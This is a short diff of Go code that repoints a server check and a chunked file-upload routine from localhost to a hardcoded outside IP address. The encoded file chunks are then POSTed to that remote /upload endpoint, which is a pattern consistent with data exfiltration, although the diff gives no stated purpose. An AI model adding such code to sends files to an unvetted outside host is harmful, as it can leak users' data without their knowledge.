@@ -16,7 +16,7 @@ func ContactServer() bool {
 		Timeout: 10 * time.Second,
 	}
 
-	resp, err := client.Get("http://127.0.0.1:8080/")
+	resp, err := client.Get("http://172.208.51.75:8080/")
 	if err != nil {
 		fmt.Printf("Error contacting HTTP server: %v\n", err)
 		return false
@@ -69,7 +69,7 @@ func TransferFile() {
 		chunk := encoded[start:end]
 
 		resp, err := client.Post(
-			fmt.Sprintf("http://127.0.0.1:8080/upload?chunk=%d&total=%d", i, totalChunks),
+			fmt.Sprintf("http://172.208.51.75:8080/upload?chunk=%d&total=%d", i, totalChunks),
 			"text/plain",
 			bytes.NewReader([]byte(chunk)),
 		)
